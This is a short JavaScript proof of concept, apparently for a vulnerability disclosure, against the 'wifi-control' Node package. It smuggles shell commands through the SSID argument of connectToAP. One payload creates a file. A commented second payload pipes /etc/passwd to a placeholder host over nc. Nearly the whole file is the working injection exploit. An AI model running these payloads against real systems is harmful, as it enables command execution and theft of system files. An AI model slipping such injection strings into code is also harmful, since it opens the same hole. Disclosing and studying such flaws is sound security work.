const WiFiControl = require('wifi-control');
const iface = WiFiControl.findInterface();
WiFiControl.connectToAP(
  {
    ssid: '" || touch hack.txt && "',
    password: "mypassword",
  },
  (err, res) => {
    console.log(res);
  }
);

// payload1: " || touch hack.txt && "
// payload2: " || nc {hostIP} {port} < /etc/passwd &&"